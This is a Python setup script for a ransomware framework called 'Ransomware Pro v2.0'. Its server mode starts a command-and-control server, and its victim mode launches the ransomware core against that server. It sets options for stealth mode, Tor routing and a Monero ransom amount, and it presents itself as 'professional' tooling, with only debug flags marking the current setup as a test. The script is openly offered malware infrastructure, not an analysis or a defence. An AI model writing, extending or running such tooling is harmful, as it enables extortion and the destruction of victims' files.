#!/usr/bin/env python3
"""
RANSOMWARE PRO - LOCAL TESTING SETUP
====================================
Sets up environment for local VM testing.

Usage:
  HOST PC (this machine):
    python setup_test.py server
    
  VICTIM VM:
    python setup_test.py victim --server-ip 192.168.126.200
"""

import sys
import os
import subprocess
import argparse

def setup_server():
    """Setup server environment"""
    print("[+] Setting up C2 SERVER environment...")
    
    # Create database directory
    db_dir = 'C:\\ransomware' if sys.platform == 'win32' else '/var/ransomware'
    os.makedirs(db_dir, exist_ok=True)
    print(f"[✓] Database directory: {db_dir}")
    
    # Set environment variables
    os.environ['RANSOMWARE_ROLE'] = 'server'
    os.environ['STEALTH_MODE'] = 'false'  # Allow debug output for testing
    os.environ['DEBUG_MODE'] = 'true'
    os.environ['USE_TOR'] = 'false'  # Local testing, no Tor
    
    print("[✓] Environment variables set:")
    print("  RANSOMWARE_ROLE=server")
    print("  STEALTH_MODE=false")
    print("  DEBUG_MODE=true")
    print("  USE_TOR=false")
    
    print("\n[*] Starting C2 SERVER on 0.0.0.0:5000...")
    print("[*] Make sure to install requirements first: pip install -r requirements.txt\n")
    
    try:
        from c2_server import app
        app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
    except Exception as e:
        print(f"[!] Error starting server: {e}")
        sys.exit(1)

def setup_victim(server_ip):
    """Setup victim environment"""
    print("[+] Setting up VICTIM environment...")
    print(f"[+] Target C2 Server: {server_ip}:5000")
    
    # Create test directory
    test_dir = os.path.expanduser('~\\ransomware_test')
    os.makedirs(test_dir, exist_ok=True)
    print(f"[✓] Test directory: {test_dir}")
    
    # Set environment variables
    os.environ['RANSOMWARE_ROLE'] = 'victim'
    os.environ['C2_HOST'] = server_ip
    os.environ['C2_PORT'] = '5000'
    os.environ['STEALTH_MODE'] = 'false'  # Allow debug output
    os.environ['DEBUG_MODE'] = 'true'
    os.environ['USE_TOR'] = 'false'  # Local testing, no Tor
    os.environ['RANSOM_XMR'] = '0.1'  # 0.1 XMR for testing
    
    print("[✓] Environment variables set:")
    print(f"  C2_HOST={server_ip}")
    print("  C2_PORT=5000")
    print("  STEALTH_MODE=false")
    print("  DEBUG_MODE=true")
    print("  USE_TOR=false")
    print("  RANSOM_XMR=0.1")
    
    print("\n[*] Starting RANSOMWARE VICTIM...")
    print("[*] Make sure to install requirements first: pip install -r requirements.txt\n")
    
    try:
        from ransomware_core import RansomwareCore
        ransomware = RansomwareCore()
        ransomware.run()
    except Exception as e:
        print(f"[!] Error starting victim: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='Ransomware Pro Testing Setup')
    parser.add_argument('role', choices=['server', 'victim'], 
                       help='Role: server (C2) or victim (payload)')
    parser.add_argument('--server-ip', default='192.168.126.200',
                       help='C2 server IP (for victim mode)')
    
    args = parser.parse_args()
    
    print("""
╔═══════════════════════════════════════════════════════════╗
║  RANSOMWARE PRO v2.0 - LOCAL TESTING SETUP               ║
║  Professional Ransomware Framework (Testing Mode)         ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    if args.role == 'server':
        setup_server()
    else:
        setup_victim(args.server_ip)

if __name__ == '__main__':
    main()
